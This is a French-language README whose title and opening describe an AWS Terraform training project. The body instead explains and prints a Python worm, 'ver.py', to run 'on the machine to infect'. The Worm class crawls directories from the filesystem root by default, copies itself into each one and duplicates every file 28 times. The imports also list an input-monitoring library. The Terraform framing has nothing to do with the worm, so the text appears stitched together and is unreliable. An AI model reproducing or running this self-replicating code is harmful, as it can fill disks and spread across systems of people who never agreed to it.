<div style="display:flex; align-items:center;">
  <h1 style="margin-right:auto;">Projet-AWS-terraform</h1>
 <img src="https://img.shields.io/badge/Made%20with-terraform-blue" alt="Terraform badge">
</div>


---

***

Dans le cadre de notre semaine de formation sur les outils terraform et puppet nous avons un projet terraform à créer

## Sujet

Dans le cadre du projet nous devons déployer une infra complète aws avec terrafom, les prérequis sont :

- un module pour créer une instance ec2 utilisant la dernière version de ubuntu
- un module pour créer un volume ebs dont la taille sera variabilisée
- un module pour créer une security qui ouvrira le 80 et 443
- un dossier app qui va utiliser les 4 modules pour déployer une ec2


### Pré-requis

Il faut executer le fichier ver.py et avoir un dossier test ou le vers pourras ce dupliquer.


### Installation

* _Pour_ _Windows_ :

  Pour installer python il faut se rendre sur https://www.python.org/downloads/

* _Pour_ _Ubuntu_ :

  Pour installer python il faut utiliser la commande sudo apt-get install python

## Démarrage

Pour lancer le logiciel il faut juste taper *Python3 ver.py* sur la machine a infecter


## Explication du code 


* _Pour_ _ver.py_ :

--------------------------Les imports---------------------

os fournit une façon portable d'utiliser les fonctionnalités dépendantes du système d'exploitation

pynput permet de contrôler et de surveiller les périphériques d'entrée.

datime permet fournir différentes fonctions liées au temps 

logging permet de gerer les logs


----------------------Traitement------------------------

Tout d'abords nous avons la class worm pour la création de notre vers , le ver ce copy et ce replique dans un dossier test et modifie les extensions des fichier copié

```python
class Worm:
    def __init__(self, path=None, target_dir_list=None, iteration=None):
        if isinstance(path, type(None)):
            self.path="/"
        else:
            self.path = path
        
        if isinstance(target_dir_list, type(None)):
            self.target_dir_list=[]
        else:
            self.target_dir_list = target_dir_list

        if isinstance(target_dir_list, type(None)):
            self.iteration = 28
        else:
            self.iteration = iteration

        # path absolu
        self.own_path = os.path.realpath(__file__)
    
    def list_directories(self, path):
        self.target_dir_list.append(path)
        files_in_current_directory = os.listdir(path)

        for file in files_in_current_directory:
            
            if not file.startswith('.'):
                # Prends le PATH complet
                absolute_path = os.path.join(path, file)
                print(absolute_path)

                if os.path.isdir(absolute_path):
                    self.list_directories(absolute_path)
                else:
                    pass
    
    def create_new_worm(self):
         for directory in self.target_dir_list:
            destination = os.path.join(directory, "vers.py")
            # Copie le script dans le nouveau répertoire avec un noms similaires
            shutil.copyfile(self.own_path, destination)

    def copy_existing_file(self):
        # La méthode suivante sera utilisée pour dupliquer les fichiers un nombre de fois (iteration)
         for directory in self.target_dir_list:
            file_list_in_dir = os.listdir(directory)
            for file in file_list_in_dir:
                abs_path = os.path.join(directory, file)
                if not abs_path.startswith('.') and not os.path.isdir(abs_path):
                    source = abs_path
                    for i in range(self.iteration):
                        destination = os.path.join(directory,(file+str(i)))
                        shutil.copyfile(source, destination)

   
    def start_worm_actions(self):
        self.list_directories(self.path)
        print(self.target_dir_list)
        self.create_new_worm()
        self.copy_existing_file()
  ```
 
 
Le code suivant permet d'appeler toutes les foncitons au lancement du ver
